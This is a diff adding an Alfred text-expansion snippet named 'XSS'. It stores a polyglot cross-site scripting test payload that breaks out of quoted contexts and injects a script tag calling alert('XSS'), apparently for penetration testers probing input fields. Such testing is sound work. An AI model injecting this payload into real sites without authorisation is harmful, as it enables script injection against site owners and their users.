@@ -1,0 +1,8 @@
+{
+  "alfredsnippet" : {
+    "snippet" : "';alert(String.fromCharCode(88,83,83))\/\/';alert(String.fromCharCode(88,83,83))\/\/\";\nalert(String.fromCharCode(88,83,83))\/\/\";alert(String.fromCharCode(88,83,83))\/\/--\n><\/SCRIPT>\">'><SCRIPT>alert(String.fromCharCode(88,83,83))<\/SCRIPT>",
+    "uid" : "A4285E6C-010D-4E05-B12B-077BFBDF2168",
+    "name" : "XSS",
+    "keyword" : ""
+  }
+}
